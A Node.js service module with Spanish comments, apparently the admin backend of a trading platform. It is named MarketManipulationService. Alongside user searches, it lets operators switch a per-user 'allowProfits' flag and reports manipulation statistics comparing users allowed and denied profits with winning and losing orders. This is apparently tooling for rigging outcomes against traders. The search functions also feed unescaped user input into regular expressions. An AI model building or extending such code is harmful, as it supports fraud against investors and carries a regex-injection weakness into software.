const User = require("../models/User");
const Order = require("../models/Order");

class MarketManipulationService {
  // Obtener todos los usuarios
  static async getAllUsers() {
    try {
      return await User.find({ role: "user" })
        .select("-password")
        .sort({ date: -1 });
    } catch (error) {
      throw new Error("Error al obtener usuarios: " + error.message);
    }
  }

  // Buscar usuarios por email
  static async searchUsersByEmail(email) {
    try {
      return await User.find({
        email: { $regex: email, $options: "i" },
        role: "user",
      }).select("-password");
    } catch (error) {
      throw new Error("Error en la búsqueda por email: " + error.message);
    }
  }

  // Buscar usuarios por nombre
  static async searchUsersByName(name) {
    try {
      const searchRegex = new RegExp(name, "i");
      return await User.find({
        $or: [
          { firstName: searchRegex },
          { lastName: searchRegex },
          { username: searchRegex },
        ],
        role: "user",
      }).select("-password");
    } catch (error) {
      throw new Error("Error en la búsqueda por nombre: " + error.message);
    }
  }

  // Buscar usuarios por fecha
  static async searchUsersByDate(date) {
    try {
      const searchDate = new Date(date);
      const nextDay = new Date(searchDate);
      nextDay.setDate(nextDay.getDate() + 1);

      return await User.find({
        date: {
          $gte: searchDate,
          $lt: nextDay,
        },
        role: "user",
      }).select("-password");
    } catch (error) {
      throw new Error("Error en la búsqueda por fecha: " + error.message);
    }
  }

  // Activar/desactivar ganancias para un usuario
  static async toggleUserProfits(userId, allowProfits) {
    try {
      const user = await User.findById(userId);
      if (!user) {
        throw new Error("Usuario no encontrado");
      }

      user.allowProfits = allowProfits;
      await user.save();

      return user;
    } catch (error) {
      throw new Error(
        "Error al actualizar estado de ganancias: " + error.message
      );
    }
  }

  // Obtener estadísticas de manipulación
  static async getManipulationStats() {
    try {
      const totalUsers = await User.countDocuments({ role: "user" });
      const usersWithProfits = await User.countDocuments({
        role: "user",
        allowProfits: true,
      });
      const usersWithoutProfits = totalUsers - usersWithProfits;

      const profitOrders = await Order.countDocuments({
        status: "completada",
        result: { $gt: 0 },
      });
      const lossOrders = await Order.countDocuments({
        status: "completada",
        result: { $lt: 0 },
      });

      return {
        totalUsers,
        usersWithProfits,
        usersWithoutProfits,
        profitOrders,
        lossOrders,
      };
    } catch (error) {
      throw new Error("Error al obtener estadísticas: " + error.message);
    }
  }
}

module.exports = MarketManipulationService;
